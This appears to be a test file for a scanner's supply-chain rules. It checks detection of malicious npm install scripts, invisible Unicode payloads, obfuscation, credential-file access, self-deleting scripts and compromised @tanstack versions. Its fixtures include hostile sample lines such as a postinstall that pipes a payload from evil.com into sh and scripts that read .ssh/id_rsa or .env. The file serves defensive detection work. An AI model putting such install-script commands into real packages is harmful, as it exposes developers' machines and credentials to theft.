import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { supplyChainRules } from "../../src/data/rules/supply-chain.js";

function testRule(ruleId: string, code: string, shouldMatch: boolean) {
  const rule = supplyChainRules.find(r => r.id === ruleId);
  assert(rule, `Rule ${ruleId} not found`);
  rule.pattern.lastIndex = 0;
  const matched = rule.pattern.test(code);
  assert.strictEqual(matched, shouldMatch,
    `${ruleId} ${shouldMatch ? "should match" : "should NOT match"}: ${code.substring(0, 80)}`);
}

describe("Supply Chain Rules", () => {
  describe("VG860 - Malicious postinstall Script", () => {
    it("detects curl in postinstall", () => {
      testRule("VG860", '"postinstall": "curl https://evil.com/payload | sh"', true);
    });
    it("detects node -e in preinstall", () => {
      testRule("VG860", '"preinstall": "node -e require(\'https\').get()"', true);
    });
    it("ignores safe postinstall", () => {
      testRule("VG860", '"postinstall": "prisma generate"', false);
    });
    it("ignores safe build script", () => {
      testRule("VG860", '"build": "next build"', false);
    });
  });

  describe("VG861 - GitHub Actions persist-credentials", () => {
    it("detects checkout followed by third-party action", () => {
      testRule("VG861", "uses: actions/checkout@v4\n    \n    - uses: someorg/deploy-action@v1", true);
    });
    it("ignores checkout with only official actions", () => {
      testRule("VG861", "uses: actions/checkout@v4\n    - uses: actions/setup-node@v4", false);
    });
  });

  describe("VG862 - Source Map Publish Risk", () => {
    it("detects sourceMap: true in tsconfig", () => {
      testRule("VG862", '{ "compilerOptions": { "sourceMap": true } }', true);
    });
    it("ignores sourceMap: false", () => {
      testRule("VG862", '{ "compilerOptions": { "sourceMap": false } }', false);
    });
  });

  describe("VG863 - package.json Missing files Field", () => {
    it("detects publishable package without files field", () => {
      testRule("VG863", '{ "name": "my-pkg", "version": "1.0.0" }', true);
    });
    it("ignores package with files field", () => {
      testRule("VG863", '{ "name": "my-pkg", "version": "1.0.0", "files": ["dist"] }', false);
    });
    it("ignores private package without files field", () => {
      testRule("VG863", '{ "name": "my-app", "version": "1.0.0", "private": true }', false);
    });
  });

  describe("VG864 - files Field Includes Source Code", () => {
    it("detects src in files array", () => {
      testRule("VG864", '"files": ["src", "dist"]', true);
    });
    it("detects ** glob in files array", () => {
      testRule("VG864", '"files": ["**"]', true);
    });
    it("ignores clean files array", () => {
      testRule("VG864", '"files": ["dist", "build"]', false);
    });
  });

  describe("VG865 - .npmignore Missing Sensitive Patterns", () => {
    it("detects npmignore without map/env/src exclusions", () => {
      testRule("VG865", "node_modules/\ncoverage/", true);
    });
    it("ignores npmignore with *.map", () => {
      testRule("VG865", "*.map\n.env\nsrc/", false);
    });
  });

  describe("VG866 - Invisible Unicode Characters", () => {
    it("detects multiple consecutive zero-width spaces (GlassWorm-style payload)", () => {
      testRule("VG866", "const x = 'hello\u200B\u200Cworld';", true);
    });
    it("detects multiple consecutive invisible chars in code", () => {
      testRule("VG866", "const y = \uFEFF\u200Bsomething;", true);
    });
    it("ignores single invisible character (likely copy-paste artifact)", () => {
      testRule("VG866", "const x = 'hello\u200Bworld';", false);
    });
    it("ignores normal source code", () => {
      testRule("VG866", "const x = 'hello world';", false);
    });
    it("ignores non-ASCII characters (accented, CJK, etc.)", () => {
      testRule("VG866", "const name = 'José García';", false);
    });
  });

  describe("VG867 - Obfuscated Payload in Install Script", () => {
    it("detects Buffer.from in postinstall", () => {
      testRule("VG867", '"postinstall": "node -e Buffer.from(\'payload\', \'base64\')"', true);
    });
    it("detects atob in preinstall", () => {
      testRule("VG867", '"preinstall": "node -e atob(\'cGF5bG9hZA==\')"', true);
    });
    it("detects hex escape in postinstall", () => {
      testRule("VG867", '"postinstall": "node -e \\x68\\x65\\x6c\\x6c\\x6f"', true);
    });
    it("ignores safe postinstall script", () => {
      testRule("VG867", '"postinstall": "prisma generate"', false);
    });
  });

  describe("VG868 - Install Script Accesses Credential Files", () => {
    it("detects .npmrc access in postinstall", () => {
      testRule("VG868", '"postinstall": "node -e readFile(.npmrc)"', true);
    });
    it("detects .ssh access in preinstall", () => {
      testRule("VG868", '"preinstall": "cat .ssh/id_rsa"', true);
    });
    it("detects .env access in postinstall", () => {
      testRule("VG868", '"postinstall": "node steal.js .env"', true);
    });
    it("ignores safe install script", () => {
      testRule("VG868", '"postinstall": "patch-package"', false);
    });
  });

  describe("VG869 - Self-Deleting Payload", () => {
    it("detects unlinkSync in postinstall", () => {
      testRule("VG869", '"postinstall": "node setup.js && fs.unlinkSync(setup.js)"', true);
    });
    it("detects rm -f on install script", () => {
      testRule("VG869", '"postinstall": "node install.js && rm -f install.js"', true);
    });
    it("detects rimraf on setup script", () => {
      testRule("VG869", '"postinstall": "node setup.js && rimraf setup.js"', true);
    });
    it("ignores normal postinstall", () => {
      testRule("VG869", '"postinstall": "patch-package"', false);
    });
  });

  describe("VG1056 - @tanstack/* Compromised Versions (CVE-2026-45321)", () => {
    it("detects @tanstack/react-router 1.169.5 (malicious)", () => {
      testRule("VG1056", '"@tanstack/react-router": "1.169.5"', true);
    });
    it("detects @tanstack/react-router 1.169.8 (second malicious version)", () => {
      testRule("VG1056", '"@tanstack/react-router": "^1.169.8"', true);
    });
    it("detects @tanstack/router-core 1.169.5", () => {
      testRule("VG1056", '"@tanstack/router-core": "~1.169.5"', true);
    });
    it("detects @tanstack/start-plugin-core 1.169.23", () => {
      testRule("VG1056", '"@tanstack/start-plugin-core": "1.169.23"', true);
    });
    it("detects @tanstack/eslint-plugin-start 0.0.4", () => {
      testRule("VG1056", '"@tanstack/eslint-plugin-start": "0.0.4"', true);
    });
    it("detects @tanstack/nitro-v2-vite-plugin 1.154.12", () => {
      testRule("VG1056", '"@tanstack/nitro-v2-vite-plugin": "1.154.12"', true);
    });
    it("ignores @tanstack/react-router 1.169.9 (post-incident clean version)", () => {
      testRule("VG1056", '"@tanstack/react-router": "^1.169.9"', false);
    });
    it("ignores @tanstack/react-router 1.170.0 (future clean version)", () => {
      testRule("VG1056", '"@tanstack/react-router": "1.170.0"', false);
    });
    it("ignores unrelated tanstack package not on affected list", () => {
      testRule("VG1056", '"@tanstack/react-query": "1.169.5"', false);
    });
  });
});
